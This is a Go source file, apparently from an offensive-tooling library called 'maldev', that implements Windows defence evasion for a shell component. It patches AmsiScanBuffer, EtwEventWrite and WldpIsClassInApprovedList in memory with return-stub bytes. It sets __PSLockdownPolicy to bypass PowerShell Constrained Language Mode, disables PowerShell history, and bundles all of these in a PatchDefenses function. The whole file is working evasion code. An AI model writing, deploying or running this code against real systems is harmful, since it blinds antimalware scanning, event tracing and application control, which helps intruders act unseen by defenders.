//go:build windows

package shell

import (
	"fmt"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// WindowsVersion contains Windows version information.
type WindowsVersion struct {
	Major int
	Minor int
	Build int
}

// applyEvasion applies configured evasion techniques on Windows.
func applyEvasion(cfg *EvasionConfig) error {
	if cfg == nil {
		return nil
	}

	version := getWindowsVersion()
	var errors []error

	if cfg.PatchAMSI && version.Build >= 14393 {
		if err := patchAMSI(); err != nil {
			errors = append(errors, fmt.Errorf("AMSI: %w", err))
		}
	}

	if cfg.PatchETW && version.Major >= 10 {
		if err := patchETW(); err != nil {
			errors = append(errors, fmt.Errorf("ETW: %w", err))
		}
	}

	if cfg.BypassCLM && version.Major >= 10 {
		if err := bypassCLM(); err != nil {
			errors = append(errors, fmt.Errorf("CLM: %w", err))
		}
	}

	if cfg.PatchWLDP && version.Build >= 14393 {
		if err := patchWLDP(); err != nil {
			errors = append(errors, fmt.Errorf("WLDP: %w", err))
		}
	}

	if cfg.DisablePSHist {
		if err := disablePSHistory(); err != nil {
			errors = append(errors, fmt.Errorf("PSHistory: %w", err))
		}
	}

	if len(errors) > 0 {
		return fmt.Errorf("evasion patches (non-fatal): %v", errors)
	}

	return nil
}

// PatchDefenses applies all available evasion patches.
func PatchDefenses() error {
	return applyEvasion(&EvasionConfig{
		PatchAMSI:     true,
		PatchETW:      true,
		BypassCLM:     true,
		PatchWLDP:     true,
		DisablePSHist: true,
	})
}

// getWindowsVersion retrieves the current Windows version.
func getWindowsVersion() WindowsVersion {
	version := windows.RtlGetVersion()
	return WindowsVersion{
		Major: int(version.MajorVersion),
		Minor: int(version.MinorVersion),
		Build: int(version.BuildNumber),
	}
}

// patchAMSI patches AmsiScanBuffer to return E_INVALIDARG.
func patchAMSI() error {
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		return fmt.Errorf("LoadDLL: %w", err)
	}
	defer amsi.Release()

	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("FindProc: %w", err)
	}

	// mov eax, 0x80070057; ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	return api.PatchMemory(amsiScanBuffer.Addr(), patch)
}

// patchETW patches EtwEventWrite to return success immediately.
func patchETW() error {
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadDLL: %w", err)
	}
	defer ntdll.Release()

	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return fmt.Errorf("FindProc: %w", err)
	}

	// xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}
	return api.PatchMemory(etwEventWrite.Addr(), patch)
}

// patchWLDP patches WldpIsClassInApprovedList to always return true.
func patchWLDP() error {
	wldp, err := windows.LoadDLL("wldp.dll")
	if err != nil {
		return nil // May not exist
	}
	defer wldp.Release()

	wldpIsClassInApprovedList, err := wldp.FindProc("WldpIsClassInApprovedList")
	if err != nil {
		return nil
	}

	// xor eax, eax; ret — returns S_OK (0)
	patch := []byte{0x33, 0xC0, 0xC3}
	return api.PatchMemory(wldpIsClassInApprovedList.Addr(), patch)
}

// disablePSHistory disables PowerShell command history via environment variables.
func disablePSHistory() error {
	envVars := map[string]string{
		"PSModuleAutoloadingPreference": "None",
		"HISTFILE":                      "",
		"HISTFILESIZE":                  "0",
		"HISTSIZE":                      "0",
	}

	for key, value := range envVars {
		err := windows.SetEnvironmentVariable(
			windows.StringToUTF16Ptr(key),
			windows.StringToUTF16Ptr(value),
		)
		if err != nil {
			return fmt.Errorf("SetEnvironmentVariable %s: %w", key, err)
		}
	}

	return nil
}

// bypassCLM bypasses PowerShell Constrained Language Mode.
func bypassCLM() error {
	err := windows.SetEnvironmentVariable(
		windows.StringToUTF16Ptr("__PSLockdownPolicy"),
		windows.StringToUTF16Ptr("0"),
	)
	if err != nil {
		return fmt.Errorf("SetEnvironmentVariable: %w", err)
	}

	return nil
}

// CheckIfRunningAsAdmin checks if the current process has admin privileges.
func CheckIfRunningAsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	var token windows.Token
	proc, _ := windows.GetCurrentProcess()
	if err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token); err != nil {
		return false
	}
	defer token.Close()

	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}

	return member
}
